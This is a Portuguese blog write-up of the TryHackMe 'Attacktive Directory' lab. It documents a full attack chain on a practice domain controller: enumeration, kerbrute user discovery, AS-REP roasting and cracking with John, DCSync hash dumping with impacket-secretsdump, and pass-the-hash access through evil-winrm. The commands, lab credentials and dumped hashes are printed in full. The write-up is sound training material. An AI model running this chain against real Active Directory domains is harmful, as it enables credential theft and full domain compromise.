---
description: CTF do TryhackME como fiz e anotações.
title: TryhackMe - Attacktive Directory - Fácil
date: 2024-01-30 18:10:00 +/-0300
categories: [CTF, TryHackMe]
tags: [ctf, tryhackme, windows, active directory, facil]     # TAG names should always be lowercase
show_image_post: true
---

![Logo](/assets/img/attacktivedir.png){: w="100" h="100" .left}

---

# **CTF - Attacktive Directory**
---
---
## **Enumeração**


### nmap

```shell
╭─     ~/thm/attacktive                                                                                                        INT ✘  16s   
╰─ sudo nmap -sV -Pn --min-rate 1000 --stats-every=7s 10.10.143.4 -oA nmap -p-
Nmap scan report for 10.10.143.4
Host is up (0.22s latency).
Not shown: 65508 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-27 01:07:35Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 136.03 seconds
```
{: .nolineno }
### nmap smb ports -sC
```shell

─     ~/thm/attacktive                                                                                                                   1 ✘ 
╰─ sudo nmap -sV -Pn --min-rate 1000 --stats-every=7s 10.10.143.4 -oA nmapscSMB -p 139,445 -sC 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-26 22:28 -03
Nmap scan report for 10.10.143.4
Host is up (0.23s latency).

PORT    STATE SERVICE       VERSION
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-01-27T01:28:54
|_  start_date: N/A
|_clock-skew: -7s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.61 seconds
```
{: .nolineno }

### enum4linux

```shell
╭─     ~/thm/attacktive                                                                                                         ✔  2m 17s   
╰─ /usr/bin/enum4linux -a 10.10.143.4           
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Jan 26 22:14:47 2024

 =========================================( Target Information )=========================================
                                                             
Target ........... 10.10.143.4                                                                                                                      
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 ============================( Enumerating Workgroup/Domain on 10.10.143.4 )============================
                                                                         
[E] Can't find workgroup/domain                                                       
 ================================( Nbtstat Information for 10.10.143.4 )================================
                                                             
Looking up status of 10.10.143.4                                                                                                                    
No reply from 10.10.143.4

 ====================================( Session Check on 10.10.143.4 )====================================
  
[+] Server 10.10.143.4 allows sessions using username '', password '
 =================================( Getting domain SID for 10.10.143.4 )=================================

Domain Name: THM-AD                                                       
Domain Sid: S-1-5-21-3591857110-2884097990-301047963

[+] Host is part of a domain (not a workgroup)                                                   
 ===================================( OS information on 10.10.143.4 )===================================

[E] Can't get OS info with smbclient                                                     
[+] Got OS info for 10.10.143.4 from srvinfo:                                                                                                       
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED                                      
 ========================================( Users on 10.10.143.4 )========================================

[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED                                                                                
   
[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED                                                                                 
==================================( Share Enumeration on 10.10.143.4 )==================================

do_connect: Connection to 10.10.143.4 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                              

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.143.4                                                            
 ============================( Password Policy Information for 10.10.143.4 )============================

[E] Unexpected error from polenum:                                                                                                                  

[+] Attaching to 10.10.143.4 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.143.4)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.

[E] Failed to get password policy with rpcclient                                                     
 =======================================( Groups on 10.10.143.4 )=======================================
  
[+] Getting builtin groups:                                                      
[+]  Getting builtin group memberships:                                                 
[+]  Getting local groups:                                                      
[+]  Getting local group memberships:                                                 
[+]  Getting domain groups:                                                      
[+]  Getting domain group memberships:                                                 
 ===================( Users on 10.10.143.4 via RID cycling (RIDS: 500-550,1000-1050) )===================           
[I] Found new SID:                                                         
S-1-5-21-3591857110-2884097990-301047963                     
[I] Found new SID:                                                         
S-1-5-21-3591857110-2884097990-301047963                     
[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username '', password ''                                        
S-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\Administrator (Local User)                                                        
S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\Guest (Local User)
S-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC\DefaultAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC\WDAGUtilityAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC\None (Domain Group)

[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username '', password ''                                         
S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)                                                        
S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)

 ================================( Getting printer info for 10.10.143.4 )================================
 
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED                                      
enum4linux complete on Fri Jan 26 22:26:44 2024
```
{: .nolineno }

Enumerando usuários com kerbrute, com a wordlist recomendada no exercício -> <https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt>

### kerbrute

```shell
╭─     ~/thm/attacktive                                                                                                        INT ✘  22s   
╰─ ./kerbrute userenum --dc 10.10.143.4 -d spookysec.local users.txt -t 100 -o usersON.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/26/24 - Ronnie Flathers @ropnop

2024/01/26 22:52:57 >  Using KDC(s):
2024/01/26 22:52:57 >   10.10.143.4:88

2024/01/26 22:52:57 >  [+] VALID USERNAME:       james@spookysec.local
2024/01/26 22:52:58 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2024/01/26 22:52:58 >  [+] VALID USERNAME:       James@spookysec.local
2024/01/26 22:52:58 >  [+] VALID USERNAME:       robin@spookysec.local
2024/01/26 22:53:00 >  [+] VALID USERNAME:       darkstar@spookysec.local
2024/01/26 22:53:02 >  [+] VALID USERNAME:       administrator@spookysec.local
2024/01/26 22:53:04 >  [+] VALID USERNAME:       backup@spookysec.local
2024/01/26 22:53:05 >  [+] VALID USERNAME:       paradox@spookysec.local
2024/01/26 22:53:14 >  [+] VALID USERNAME:       JAMES@spookysec.local
2024/01/26 22:53:16 >  [+] VALID USERNAME:       Robin@spookysec.local
2024/01/26 22:53:30 >  [+] VALID USERNAME:       Administrator@spookysec.local
2024/01/26 22:54:01 >  [+] VALID USERNAME:       Darkstar@spookysec.local
2024/01/26 22:54:11 >  [+] VALID USERNAME:       Paradox@spookysec.local
2024/01/26 22:55:07 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2024/01/26 22:56:00 >  [+] VALID USERNAME:       ori@spookysec.local
2024/01/26 22:56:40 >  [+] VALID USERNAME:       ROBIN@spookysec.local
2024/01/26 22:58:25 >  Done! Tested 73317 usernames (16 valid) in 327.941 seconds
```
{: .nolineno }

Depois que a enumeração de contas de usuário estiver concluída, podemos tentar abusar de um recurso dentro do Kerberos com um método de ataque chamado ASREPRoasting. O ASReproasting ocorre quando uma conta de usuário tem o privilégio "Não requer pré-autenticação" definido. Isso significa que a conta não precisa fornecer identificação válida antes de solicitar um Bilhete Kerberos na conta de usuário especificada. 

Limpando o output acima:  
`grep -oE '[^ ]+@' usersON.txt | sed 's/@$//' > usersok.txt`  
ficando somente os usuários para poder usar no `impacket-GetNPUsers`

Optei pelo `-format john` pois usar hashcat em VM é inviável.

### impacket-GetNPUsers

```shell
╭─     ~/thm/attacktive                                                                                                             ✔  8s   
╰─ impacket-GetNPUsers -no-pass -dc-ip 10.10.143.4 spookysec.local/ -format john -usersfile usersok.txt 
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$svc-admin@SPOOKYSEC.LOCAL:4ecd9e4a968f4eb73db07be1c21ca5de$39e8d2b36d43090d47466598dcde997b8f5c563b96ec22eee2f7e6d46a73ea0be752c72ebeacce14e36795503fd9d4f695078cddf65d36f1e604ec3f61bf8560f451af65d51d469b4b9085109b427fcb50b349f712b32bfc1ea5b296543f1603aa393647498b393e84a1625091b3b984c2baf3868998719e3ee9dc8ac5ab4ba48df361924b09786bf87e8b40adda12b7305cb89842c4d496034a9881f74ce5ee5d1215ffcd2fea119bf5fcc3d06a9ebc74cb206bbb53c24022a637f78283a9f88336f5a81505dcf279ae6e85a2b9cf967185ebe037526324b7a00de5d8e2158235aa447e7c463957fc55a47e62c5ae84977d
[-] User James doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User JAMES doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User DARKSTAR doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ori doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ROBIN doesn't have UF_DONT_REQUIRE_PREAUTH set
```
{: .nolineno }
Crackeando a hash do admin com john
usada a password list da sala -> <https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt>

### John

```shell
─     ~/thm/attacktive                                                                                                                     ✔ 
╰─ echo '$krb5asrep$svc-admin@SPOOKYSEC.LOCAL:4ecd9e4a968f4eb73db07be1c21ca5de$39e8d2b36d43090d47466598dcde997b8f5c563b96ec22eee2f7e6d46a73ea0be752c72ebeacce14e36795503fd9d4f695078cddf65d36f1e604ec3f61bf8560f451af65d51d469b4b9085109b427fcb50b349f712b32bfc1ea5b296543f1603aa393647498b393e84a1625091b3b984c2baf3868998719e3ee9dc8ac5ab4ba48df361924b09786bf87e8b40adda12b7305cb89842c4d496034a9881f74ce5ee5d1215ffcd2fea119bf5fcc3d06a9ebc74cb206bbb53c24022a637f78283a9f88336f5a81505dcf279ae6e85a2b9cf967185ebe037526324b7a00de5d8e2158235aa447e7c463957fc55a47e62c5ae84977d' > hashadm
╭─     ~/thm/attacktive                                                                                                                     ✔ 
╰─ john hashadm --wordlist=passwords.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 XOP 4x2])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
management2005   ($krb5asrep$svc-admin@SPOOKYSEC.LOCAL)     
1g 0:00:00:00 DONE (2024-01-26 23:57) 25.00g/s 166400p/s 166400c/s 166400C/s horoscope..amy123
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
{: .nolineno }

password: `management2005`

## **Exploração**
### Smb
Com as credenciais `svc-admin:management2005` dá pra  conectar via smb.

```shell
─     ~/thm/attacktive                                                                                                                     ✔ 
╰─ smbclient -L //10.10.143.4 -U svc-admin                                                    
Password for [WORKGROUP\svc-admin]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.143.4 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
╭─     ~/thm/attacktive                                                                                                           
╰─ smbclient //10.10.143.4/backup -U svc-admin
Password for [WORKGROUP\svc-admin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Apr  4 16:08:39 2020
  ..                                  D        0  Sat Apr  4 16:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 16:08:53 2020

                8247551 blocks of size 4096. 3633825 blocks available
smb: \> get backup_credentials.txt 
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> 
```
{: .nolineno }

```shell
╭─     ~/thm/attacktive                                                                                                                   
╰─ cat backup_credentials.txt 
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```
{: .nolineno }
Decode, qualquer dos dois comandos

```shell
╭─     ~/thm/attacktive                                                                                                                     ✔ 
╰─ base64 -d backup_credentials.txt 
backup@spookysec.local:backup2517860                                                                                                      
╭─     ~/thm/attacktive                                                                                                                     ✔ 
╰─ echo YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw |base64 -d
backup@spookysec.local:backup2517860                  
```             
{: .nolineno }
Agora que temos novas credenciais de conta de usuário, podemos ter mais privilégios no sistema do que antes. O nome de usuário da conta "backup". Para que é essa a conta de backup? 
Bem, é a conta de backup para o Controlador de Domínio. Esta conta tem uma permissão única que permite que todas as alterações do Active Directory sejam sincronizadas com esta conta de utilizador. Isso inclui hashes de senha 

Tendo isso em mente vamos dumpar as hashs das contas do AD com 
### impacket-secretsdump
```shell
─     ~/thm/attacktive                                                                                                            ✔  16s   
╰─ impacket-secretsdump spookysec.local/backup:backup2517860@10.10.143.4 -just-dc
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:3974617671cc7c7d8a7b7afd9e8af3e7:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:c37a3571b48496d71e00eb83636d84e8910ee7ef3fcc829b948e383a93bdfb91
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:a04684731f41670f88f565a876a92f3f
ATTACKTIVEDIREC$:des-cbc-md5:e03db6f28ff2cec2
[*] Cleaning up... 
```
{: .nolineno }

## **Acesso**

Usando o Evil-WinRM para conectar no AD com credenciais do administrador, a opção `-H` possibilita usar hash para logar, devemos usar a hash NTLM
que é a depois dos dois pontos.  
[*] Dumping Domain Credentials (domain\uid:rid:`lmhash:nthash`)  
[*] Using the DRSUAPI method to get NTDS.DIT secrets  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:`0e0363213e37b94221497260b0bcb4fc`:::

```shell
╭─     ~/thm/attacktive                                                                                                          1 ✘  26s   
╰─ evil-winrm -u Administrator -H 0e0363213e37b94221497260b0bcb4fc -i 10.10.143.4 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```
{: .nolineno }
![Alt text](/assets/img/attacktivedir1.png)
Buscando por todos arquivos txt na pasta e subbpastas Users

```shell
*Evil-WinRM* PS C:\Users> Get-ChildItem -Recurse -Filter "*.txt" | ForEach-Object { $_.FullName }
C:\Users\Administrator\Desktop\root.txt
C:\Users\backup\Desktop\PrivEsc.txt
C:\Users\backup.THM-AD\Desktop\PrivEsc.txt
C:\Users\svc-admin\Desktop\user.txt.txt
*Evil-WinRM* PS C:\Users> 
```
{: .nolineno }
Agora só sair dando type nos arquivos .txt
![Alt text](/assets/img/attacktivedir2.png)

**Conhecimentos adquiridos**
- Praticamente tudo.